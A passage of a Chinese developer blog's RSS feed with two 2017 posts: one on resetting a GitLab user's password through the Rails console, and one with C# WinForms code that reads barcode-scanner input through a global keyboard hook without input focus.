               <pubDate>Mon, 17 Jul 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/07/debain-save-iptables/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/07/debain-save-iptables/</guid>  
               </item>  
          
            <item>  
               <title>Gitlab重置管理员密码</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#gitlab重置管理员密码&quot; id=&quot;markdown-toc-gitlab重置管理员密码&quot;&gt;Gitlab重置管理员密码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;gitlab重置管理员密码&quot;&gt;Gitlab重置管理员密码&lt;/h1&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;shell&amp;gt; &lt;/span&gt;su - git
&lt;span class=&quot;gp&quot;&gt;shell&amp;gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt/gitlab-8.12.6-0/apps/gitlab/htdocs
&lt;span class=&quot;gp&quot;&gt;shell&amp;gt; &lt;/span&gt;bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;rails console production
&lt;span class=&quot;c&quot;&gt;# email为需要更改密码的用户账户&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;irb(main):001:0&amp;gt; &lt;/span&gt;user &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; User.where&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;email: &lt;span class=&quot;s1&quot;&gt;'jun.wang@vinny.cn'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.first
&lt;span class=&quot;c&quot;&gt;# 密码必须至少8个字符&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;irb(main):002:0&amp;gt; &lt;/span&gt;user.password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'123456'&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 返回true表示修改成功&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;irb(main):003:0&amp;gt; &lt;/span&gt;user.save!
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>  
               <pubDate>Sun, 16 Jul 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/07/gitlab-reset-admin-pwd/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/07/gitlab-reset-admin-pwd/</guid>  
               </item>  
          
            <item>  
               <title>C#无焦点扫码实现方案</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#c无焦点扫码实现方案&quot; id=&quot;markdown-toc-c无焦点扫码实现方案&quot;&gt;C#无焦点扫码实现方案&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-背景说明&quot; id=&quot;markdown-toc-1-背景说明&quot;&gt;1. 背景说明&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-程序说明&quot; id=&quot;markdown-toc-2-程序说明&quot;&gt;2. 程序说明&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-调用方法&quot; id=&quot;markdown-toc-3-调用方法&quot;&gt;3. 调用方法&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-中文问题&quot; id=&quot;markdown-toc-3-中文问题&quot;&gt;3. 中文问题&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#4-源码下载&quot; id=&quot;markdown-toc-4-源码下载&quot;&gt;4. 源码下载&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;c无焦点扫码实现方案&quot;&gt;C#无焦点扫码实现方案&lt;/h1&gt;

&lt;h2 id=&quot;1-背景说明&quot;&gt;1. 背景说明&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;无焦点扫码&lt;/strong&gt; 的意思是在没有选择输出源载体的情况下捕获扫枪的扫码事件，即没有聚焦输出源（记事本、文本框等）获取条码／二维码中的内容。&lt;/p&gt;

&lt;h2 id=&quot;2-程序说明&quot;&gt;2. 程序说明&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;BarCodeHook&lt;/code&gt;类是用于全局注册键盘钩子的核心类，一般不需要更改，直接放到工程中。&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ScanCodeForm&lt;/code&gt;类是具体调用BarCodeHook类的窗体，为了便于测试此窗体中输出使用无焦点的Label控件。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;3-调用方法&quot;&gt;3. 调用方法&lt;/h2&gt;

&lt;p&gt;下面&lt;code class=&quot;highlighter-rouge&quot;&gt;ScanCodeForm&lt;/code&gt;源码是具体怎么调用&lt;code class=&quot;highlighter-rouge&quot;&gt;BarCodeHook&lt;/code&gt;类的窗体代码，此窗体含有两个Label，一个用于最终输出条码/二维码内容的&lt;strong&gt;codeLabel&lt;/strong&gt;，一个是临时的&lt;strong&gt;tempLabel&lt;/strong&gt;，这个临时的&lt;strong&gt;tempLabel&lt;/strong&gt;不需要显示，设置为不可见即可，只是用于临时保存扫枪的字符数据，使用时你的窗体必须包含此控件，通过它的&lt;em&gt;textChange&lt;/em&gt;事件最终拿到扫枪的输入值。&lt;/p&gt;

&lt;div class=&quot;language-c# highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Collections.Generic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.ComponentModel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Drawing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Linq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Windows.Forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;NoFocusScan&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;partial&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ScanCodeForm&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Form&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// 定义BarCodeHook对象及其委托方法
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BarCodeHook&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;barCodeHook&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BarCodeHook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;delegate&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ShowInfoDelegate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BarCodeHook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BarCodes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;barCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ScanCodeForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;InitializeComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ScanCodeForm_Load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// 注册扫枪委托事件
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;barCodeHook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BarCodeEvent&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BarCodeHook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;BarCodeDeletegate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BarCodeEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// 启动扫码钩子
&lt;/span&gt;            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;barCodeHook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;codeLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;等待扫码...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;codeLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;启动失败&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BarCodeEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BarCodeHook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BarCodes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;barCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;ShowInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;barCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ShowInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BarCodeHook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BarCodes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;barCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InvokeRequired&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;BeginInvoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ShowInfoDelegate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ShowInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;barCode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// 使用隐藏的tempLabel来储存扫码字符，扫码读取会改变隐藏label的字符，
&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;// 同时触发自身的tempLabel_TextChanged事件
&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;tempLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;barCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsValid&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;barCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BarCode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;/// &amp;lt;summary&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;/// Form窗体关闭事件
&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;/// &amp;lt;/summary&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ScanCodeForm_FormClosed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormClosedEventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// 卸载注册的钩子
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;barCodeHook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;/// &amp;lt;summary&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;/// 扫码读取的字符事件
&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;/// &amp;lt;/summary&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tempLabel_TextChanged&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// 这里code就是最终得到的条码/二维码字符
&lt;/span&gt;            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tempLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;codeLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tempLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// 扫完得到二维码就清空临时tempLabel，避免再次进入textchange事件
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tempLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TextChanged&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;EventHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tempLabel_TextChanged&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tempLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tempLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TextChanged&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;EventHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tempLabel_TextChanged&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;3-中文问题&quot;&gt;3. 中文问题&lt;/h2&gt;

&lt;p&gt;条形码的输出是字母或者数字，不会有问题。二维码可能含有中文或Unicode等字符时，一般不能正常读取到。首先确认的是二维码扫枪是否支持中文解码，支持中文的二维码扫枪因为需要内置解码器所以成本较高，市面上目前现在大部分的二维码扫枪都不可以支持中文。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;BarCodeHook&lt;/code&gt;类未测试支持中文的二维码扫枪&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;4-源码下载&quot;&gt;4. 源码下载&lt;/h2&gt;

&lt;p&gt;链接: &lt;a href=&quot;http://pan.baidu.com/s/1o8oLe7w&quot;&gt;http://pan.baidu.com/s/1o8oLe7w&lt;/a&gt;  密码: &lt;strong&gt;tdei&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;NoFocusScan.zip&lt;/strong&gt;源码保存在个人百度网盘的&lt;strong&gt;博客保存的源码&lt;/strong&gt;目录中（给自己看的）&lt;/p&gt;
&lt;/blockquote&gt;

</description>  
               <pubDate>Sat, 15 Jul 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/07/no-focus-scan/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/07/no-focus-scan/</guid>  
               </item>  
          
    </channel>  
</rss>
